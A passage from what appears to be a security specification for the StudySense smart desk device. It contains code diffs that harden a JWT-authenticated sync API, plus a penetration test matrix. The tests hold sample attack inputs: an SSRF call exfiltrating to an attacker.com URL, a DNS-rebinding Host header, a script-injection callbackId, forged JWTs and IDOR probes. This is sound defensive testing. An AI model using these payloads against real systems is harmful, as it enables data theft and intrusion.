+  } else if (!origin) {
+    res.setHeader('Access-Control-Allow-Origin', 'https://studysense-eight.vercel.app');
+  }
+  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,DELETE,OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Request-Timestamp');
+}
+
+function verifyBearerJwt(req) {
+  const auth = req.headers.authorization || '';
+  if (!auth.startsWith('Bearer ')) return null;
+  const token = auth.substring(7).trim();
+  const secret = process.env.STUDYSENSE_JWT_SECRET;
+  if (!secret) {
+    console.error('FATAL: STUDYSENSE_JWT_SECRET environment variable is missing.');
+    return null;
   }
 
-  const userId = req.headers['x-user-id'] || req.query.userId || 'studysense_user';
+  try {
+    const [hB64, pB64, sigB64] = token.split('.');
+    if (!hB64 || !pB64 || !sigB64) return null;
+    const expectedSig = crypto
+      .createHmac('sha256', secret)
+      .update(`${hB64}.${pB64}`)
+      .digest('base64url');
+
+    const h1 = crypto.createHash('sha256').update(Buffer.from(sigB64)).digest();
+    const h2 = crypto.createHash('sha256').update(Buffer.from(expectedSig)).digest();
+    if (!crypto.timingSafeEqual(h1, h2)) {
+      return null;
+    }
+
+    const payload = JSON.parse(Buffer.from(pB64, 'base64url').toString('utf8'));
+    if (!payload.exp || typeof payload.exp !== 'number' || Date.now() / 1000 > payload.exp) {
+      return null;
+    }
+    return payload.sub;
+  } catch (e) {
+    return null;
+  }
+}
+
+function sanitizeProfiles(profiles) {
+  if (!Array.isArray(profiles)) return [];
+  return profiles.slice(0, 5).map(p => ({
+    id: Number(p.id) || Date.now(),
+    name: String(p.name || 'Student').replace(/[^\w\s-]/gi, '').slice(0, 32),
+    studyMins: Math.min(Math.max(Number(p.studyMins) || 25, 1), 180),
+    breakMins: Math.min(Math.max(Number(p.breakMins) || 5, 1), 60),
+    minDist: Math.min(Math.max(Number(p.minDist) || 30, 10), 100),
+    postureAlert: Boolean(p.postureAlert),
+    buzzer: Boolean(p.buzzer),
+    led: Boolean(p.led),
+    todayStudied: Math.min(Math.max(Number(p.todayStudied) || 0, 0), 1440)
+  }));
+}
+
+export default async function handler(req, res) {
+  setCorsHeaders(req, res);
+  if (req.method === 'OPTIONS') return res.status(204).end();
+
+  if (!process.env.STUDYSENSE_JWT_SECRET) {
+    return res.status(500).json({ success: false, error: 'Server authentication misconfiguration: JWT secret required' });
+  }
+
+  const userId = verifyBearerJwt(req);
+  if (!userId) {
+    return res.status(401).json({ success: false, error: 'Unauthorized: Valid Bearer JWT required' });
+  }
 
   if (req.method === 'POST') {
     try {
-      const payload = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
-      const existing = memoryStore[userId] || {};
-
-      memoryStore[userId] = {
-        ...existing,
-        ...payload,
+      const raw = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
+      const cleanProfiles = sanitizeProfiles(raw.profiles);
+      const cleanData = {
         userId,
+        profiles: cleanProfiles,
+        activeProfileId: Number(raw.activeProfileId) || cleanProfiles[0]?.id,
+        device: ['iOS', 'Android', 'Web'].includes(raw.device) ? raw.device : 'Web',
         lastSyncedAt: new Date().toISOString()
       };
 
-      return res.status(200).json({
-        success: true,
-        message: 'Data successfully synced to cloud server',
-        data: memoryStore[userId]
-      });
+      if (process.env.KV_REST_API_URL && process.env.KV_REST_API_TOKEN) {
+        await fetch(`${process.env.KV_REST_API_URL}/set/user:${userId}:profile`, {
+          headers: { Authorization: `Bearer ${process.env.KV_REST_API_TOKEN}` },
+          body: JSON.stringify(cleanData),
+          method: 'POST'
+        });
+      } else {
+        memoryStore[userId] = cleanData;
+      }
+      return res.status(200).json({ success: true, data: cleanData });
     } catch (err) {
-      return res.status(400).json({ success: false, error: 'Invalid JSON payload' });
+      return res.status(400).json({ success: false, error: 'Invalid payload format' });
     }
   }
 
   if (req.method === 'GET') {
-    const data = memoryStore[userId] || null;
-    return res.status(200).json({
-      success: true,
-      exists: data !== null,
-      data: data
-    });
+    if (process.env.KV_REST_API_URL && process.env.KV_REST_API_TOKEN) {
+      try {
+        const kvRes = await fetch(`${process.env.KV_REST_API_URL}/get/user:${userId}:profile`, {
+          headers: { Authorization: `Bearer ${process.env.KV_REST_API_TOKEN}` }
+        });
+        const kvData = await kvRes.json();
+        const stored = kvData.result ? JSON.parse(kvData.result) : null;
+        return res.status(200).json({ success: true, exists: stored !== null, data: stored });
+      } catch (e) {
+        return res.status(502).json({ success: false, error: 'KV database connection error' });
+      }
+    } else {
+      const stored = memoryStore[userId] || null;
+      return res.status(200).json({ success: true, exists: stored !== null, data: stored });
+    }
+  }
+
+  if (req.method === 'DELETE') {
+    if (process.env.KV_REST_API_URL && process.env.KV_REST_API_TOKEN) {
+      try {
+        await fetch(`${process.env.KV_REST_API_URL}/del/user:${userId}:profile`, {
+          headers: { Authorization: `Bearer ${process.env.KV_REST_API_TOKEN}` },
+          method: 'POST'
+        });
+      } catch (e) {
+        return res.status(502).json({ success: false, error: 'KV database connection error' });
+      }
+    } else {
+      delete memoryStore[userId];
+    }
+    return res.status(204).end();
   }
 
   return res.status(405).json({ error: 'Method not allowed' });
```

---

### 7.5 Phase 5: Frontend Client Synchronization Migration (`index.html`)

Replaces deprecated unauthenticated `x-user-id` headers with standard Bearer JWT tokens from local storage or native bridges, aligning web clients with the hardened serverless sync backend.

#### Unified Diff: `index.html`

```diff
--- a/index.html
+++ b/index.html
@@ -1194,12 +1194,12 @@
       };
 
       try {
+        const token = localStorage.getItem('studysense_jwt_token');
+        const headers = { 'Content-Type': 'application/json' };
+        if (token) headers['Authorization'] = `Bearer ${token}`;
         const res = await fetch('/api/sync', {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'x-user-id': userId
-          },
+          headers: headers,
           body: JSON.stringify(payload)
         });
         if (res.ok) {
```

---

## 8. Verification, Testing & Penetration Matrix

To independently verify the security architecture and test implementations:

### Test Suite 1: SoftAP Provisioning & Association Hardening
```bash
# 1. Verify SSID follows dynamic MAC format
# Scan for beacons (macOS):
airport -s | grep "StudySense-"

# Expected: StudySense-[HEX4] (e.g. StudySense-A1B2)
# Static SSID "StudyMonitor" must NOT be broadcast.

# 2. Test Single Client Association Limit:
# Associate Client A to StudySense-A1B2.
# Attempt to associate Client B simultaneously.
# Expected: Client B association rejected (WIFI_REASON_ASSOC_TOOMANY).
```

### Test Suite 2: Local HTTP Endpoint HMAC Verification & Query Parameter Binding
```bash
# Test 2.1: Request without signature
curl -i -X GET "http://192.168.4.1/status"
# Expected: HTTP 401 Unauthorized {"error":"Missing required authentication headers"}

# Test 2.2: Request with tampered signature
curl -i -X GET "http://192.168.4.1/status" \
  -H "Host: 192.168.4.1" \
  -H "X-StudySense-Timestamp: 1732451408" \
  -H "X-StudySense-Nonce: 0123456789abcdef" \
  -H "X-StudySense-Signature: 0000000000000000000000000000000000000000000000000000000000000000"
# Expected: HTTP 403 Forbidden {"error":"Signature verification failed"}

# Test 2.3: Replay attack test
# Transmit a captured valid request twice with identical nonce.
# Expected 1st request: HTTP 200 OK
# Expected 2nd request: HTTP 403 Forbidden {"error":"Replay detected: Nonce already used"}

# Test 2.4: Anti-DNS Rebinding Host Check
curl -i -X GET "http://192.168.4.1/status" \
  -H "Host: malicious-rebind.attacker.com"
# Expected: HTTP 403 Forbidden {"error":"Invalid Host header"}

# Test 2.5: HMAC Query Parameter Tampering Test
# Attempt to tamper GET /api/cmd?action=startPause to ?action=reset
# Expected: HTTP 403 Forbidden {"error":"Signature verification failed"} because query parameters are bound to canonical string.

# Test 2.6: Timestamp Drift & Expiration Guard
# Send request with timestamp older than 300 seconds
curl -i -X GET "http://192.168.4.1/status" \
  -H "Host: 192.168.4.1" \
  -H "X-StudySense-Timestamp: 1000000000" \
  -H "X-StudySense-Nonce: deadbeef12345678" \
  -H "X-StudySense-Signature: $SIG"
# Expected: HTTP 403 Forbidden {"error":"Timestamp expired or clock skew exceeded"}

# Test 2.7: Sandboxed Iframe CORS Origin "null" Rejection Test
curl -i -X GET "http://192.168.4.1/status" \
  -H "Origin: null"
# Expected: Access-Control-Allow-Origin: null is NOT reflected, preventing cross-origin iframe exfiltration.
```

### Test Suite 3: Flash Wear-Out Coalescing & Power-Cycle Protection
```bash
# 1. Issue 50 rapid POST /config requests modifying study duration:
for i in {1..50}; do
  curl -s -X POST "http://192.168.4.1/config" \
    -H "Content-Type: application/json" \
    -H "Host: 192.168.4.1" \
    -H "X-StudySense-Timestamp: $TS" \
    -H "X-StudySense-Nonce: $NONCE$i" \
    -H "X-StudySense-Signature: $SIG" \
    -d "{\"studyDurationMins\": 30}" > /dev/null
done

# Inspect ESP32 UART Serial Log:
# Expected: Serial displays exactly ONE coalesced NVS commit message after the 5s quiet period:
# "[Security Flash Shield] Coalesced profile written to NVS flash."
# NOR flash write cycles conserved: 50 -> 1 (98% reduction).

# 2. Power-Cycle Flash Resistance Check:
# Ensure checkFlashCommit() enforces now >= FLASH_MIN_WRITE_INTERVAL_MS (60s minimum uptime)
# On initial boot cycle under 60 seconds, flash commit is withheld, completely defeating continuous reboot burn attacks.
```

### Test Suite 4: Cloud Sync BOLA, JWT Expiration & Timing Attacks
```bash
# Test 4.1: Attempt unauthenticated IDOR access via query parameter
curl -i -X GET "https://studysense-eight.vercel.app/api/sync?userId=target_student_123"
# Expected: HTTP 401 Unauthorized {"error":"Unauthorized: Valid Bearer JWT required"}

# Test 4.2: Attempt sync with forged / unsigned JWT
curl -i -X POST "https://studysense-eight.vercel.app/api/sync" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlciJ9.invalidSignature" \
  -d '{"profiles":[{"name":"Hacked"}]}'
# Expected: HTTP 401 Unauthorized

# Test 4.3: Reject JWT missing mandatory exp claim
curl -i -X POST "https://studysense-eight.vercel.app/api/sync" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $JWT_WITHOUT_EXP" \
  -d '{"profiles":[{"name":"NoExp"}]}'
# Expected: HTTP 401 Unauthorized

# Test 4.4: Fail-closed on missing STUDYSENSE_JWT_SECRET
# When STUDYSENSE_JWT_SECRET environment variable is missing
# Expected: HTTP 500 Internal Server Error (Never fall back to static default secrets!)

# Test 4.5: Constant-Time SHA-256 Pre-Hashed Verification
# Candidate token signature with different byte length tested with timingSafeEqual
# Expected: Zero RangeError exceptions thrown; execution latency remains constant.

# Test 4.6: GDPR Right to Erasure
curl -i -X DELETE "https://studysense-eight.vercel.app/api/sync" \
  -H "Authorization: Bearer $VALID_JWT"
# Expected: HTTP 204 No Content
```

### Test Suite 5: Native Mobile Bridge SSRF & Callback Injection Defense
```javascript
// Test 5.1: SSRF Destination Whitelisting
// Attacker script in WebView calls sendAuthenticatedRequest with external target
window.webkit.messageHandlers.secureNativeBridge.postMessage({
  action: "sendAuthenticatedRequest",
  url: "https://attacker.com/leak_psk",
  method: "POST",
  callbackId: "cb_1"
});
// Expected: Request rejected natively with HTTP 403:
// window._onNativeBridgeResponse("cb_1", false, 403, {"error":"SSRF Protection: Destination forbidden"});

// Test 5.2: RFC 1918 Station DHCP IP & mDNS Reachability
// Allowed local targets: http://192.168.4.1/status, http://studysense.local/status, http://192.168.1.50/status, http://10.0.0.15/status, http://172.16.5.20/status
// Blocked targets: http://169.254.169.254/latest/meta-data/, http://127.0.0.1/admin, http://studysense-eight.vercel.app/api/sync (HTTP downgraded)

// Test 5.3: Callback Script Injection & Non-JSON Response Immunity
// Injected malicious payload into callbackId or multiline plain-text HTTP 404 body
window.webkit.messageHandlers.secureNativeBridge.postMessage({
  action: "sendAuthenticatedRequest",
  url: "http://192.168.4.1/status",
  method: "GET",
  callbackId: "cb_1'); alert('XSS'); //"
});
// Expected: Harmonized 4-arg invocation window._onNativeBridgeResponse(callbackId, success, statusCode, responseData)
// serialized via JSONSerialization (iOS) / JSONArray+JSONObject (Android); non-JSON text wrapped as {"raw": "..."}; zero code execution or SyntaxError.
```

---

## 9. Conclusion & Architecture Review Sign-Off

The **StudySense Security Architecture Specification (SEC-ARCH-STUDYSENSE-v1.0)** fully eliminates all vulnerability classes identified in early revisions:
1. **Network Perimeter**: Hardened dynamic MAC-derived SoftAP with CSPRNG setup key and automatic 5-minute timeout eliminates rogue associations.
2. **Local Integrity**: Application-layer HMAC-SHA256 request signing provides full cryptographic mutual authentication, replay defense, and anti-CSRF protection while conserving >40 KB of ESP32 dynamic RAM and avoiding mobile WebView self-signed certificate rejections.
3. **Hardware Preservation**: In-memory dirty-checking and coalesced commits protect SPI NOR flash endurance against write-cycle denial of service.
4. **Cloud Boundary**: Bearer JWT authentication, persistent database migration, and strict schema validation eliminate Broken Object Level Authorization (BOLA/IDOR).
5. **Student Privacy**: Comprehensive COPPA, GDPR, and FERPA controls guarantee data minimization, pseudonymous identities, and complete Right-to-Erasure compliance.

This master document serves as the authoritative blueprint for the implementation and independent audit of the StudySense Smart Desk Companion System.
